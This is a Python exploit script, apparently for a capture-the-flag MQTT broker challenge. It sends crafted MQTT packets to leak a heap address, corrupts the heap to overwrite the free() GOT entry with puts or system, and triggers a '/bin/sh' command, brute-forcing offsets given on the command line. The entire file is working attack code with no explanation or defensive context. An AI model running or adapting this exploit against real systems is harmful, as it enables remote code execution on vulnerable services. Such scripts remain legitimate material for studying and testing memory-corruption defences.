import socket, struct, time, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
BIN2HEAP=0x220f0; GOT_OFF=0x20220; PUTS_OFF=0x457e0
def varint(n):
    o=b''
    while True:
        b=n%128;n//=128
        if n:o+=bytes([b|0x80])
        else:o+=bytes([b]);break
    return o
def sstr(x):
    if isinstance(x,str): x=x.encode()
    return struct.pack('>H',len(x)&0xffff)+x
def pkt(t,body,forced=None): return bytes([t])+varint(len(body) if forced is None else forced)+body
def subb(topic=None,raw=None,pl=None):
    if raw is None: body=struct.pack('>H',1)+sstr(topic)
    else: body=struct.pack('>H',1)+struct.pack('>H',raw)+pl
    return pkt(0x82,body,forced=len(body))
def unsubb(t): return pkt(0xA2,struct.pack('>H',1)+sstr(t))
def build_leak():
    o=pkt(0x10,sstr('MQTT')+bytes([4,0xC2])+struct.pack('>H',0x4321)+sstr('QWB_Client')+sstr('QWB2026_Admin')+sstr('hn5ne'))
    o+=subb('d1zz')+subb('d2zz')+subb('d3zz')
    o+=subb(b'A'*30)+subb(b'B'*30)+subb('QWB2026_News')
    o+=unsubb(b'A'*30)+unsubb(b'B'*30)
    o+=b'\xc0\x00'*6
    o+=pkt(0x30, sstr('QWB2026_News')+b'C'*30)
    return o
def build_probe(GOT_FREE, VAL, cmd=None):
    o=subb('/bin/sh')+subb('d1xx')+subb('d2xx')+subb('Xx')+subb('Yy')+subb('Z'*400)
    o+=unsubb('Yy')+unsubb('Xx')
    pl=bytearray(b'A'*272); pl[24:32]=struct.pack('>Q',0x21); pl[32:40]=struct.pack('>Q',GOT_FREE-16)
    o+=subb(raw=0xFFFF,pl=bytes(pl))
    o+=subb('AAAA')
    o+=subb(struct.pack('>Q',VAL))
    if cmd: o+=subb(cmd)+unsubb(cmd)
    else: o+=unsubb('/bin/sh')
    return o
def rd(s, secs=3.0, chunk=65536):
    out=b''; end=time.time()+secs
    while time.time()<end:
        try:
            s.settimeout(0.5); d=s.recv(chunk)
            if not d: break
            out+=d
        except Exception: pass
    return out
def probe(D, mode='puts', cmd=None):
    t0=time.time()
    try:
        s=socket.create_connection((HOST,PORT),10)
    except Exception as e: return 'CONNERR'
    s.sendall(build_leak()); time.sleep(2.5)
    buf=rd(s,1.5)
    i=buf.find(b'\x34\x2e\x00\x0cQWB2026_News')
    leak=None
    if i>=0 and len(buf)>=i+2+0x2e:
        body=buf[i+2:i+2+0x2e]
        tl=struct.unpack('>H',body[0:2])[0]
        payload=body[2+tl+2:]
        if len(payload)>=8: leak=struct.unpack('>Q',payload[:8])[0]
    if not leak:
        s.close(); return 'LEAKFAIL %.1fs %s'%(time.time()-t0, buf[-40:].hex())
    BASE=leak-BIN2HEAP
    GOT_FREE=BASE+GOT_OFF
    if mode=='puts': VAL=BASE+D+PUTS_OFF
    elif mode=='system': VAL=BASE+D+0x65370
    elif mode=='bin': VAL=BASE+D
    else: VAL=int(mode,16)
    s.sendall(build_probe(GOT_FREE,VAL,cmd)); time.sleep(2.5)
    out=rd(s,2.0)
    s.close()
    dt=time.time()-t0
    subs=out.count(b'\x90\x03\x00\x01\x01')
    if b'/bin/sh' in out: return 'HIT(base=%#x) %.1fs'%(BASE,dt)
    if cmd and out: return 'OUT %.1fs: %r'%(dt,out[:200])
    return 'MISS %.1fs subs=%d'%(dt,subs)
if __name__=='__main__':
    for D in sys.argv[3:]:
        print('D=%s ->'%D, probe(int(D,16)), flush=True)
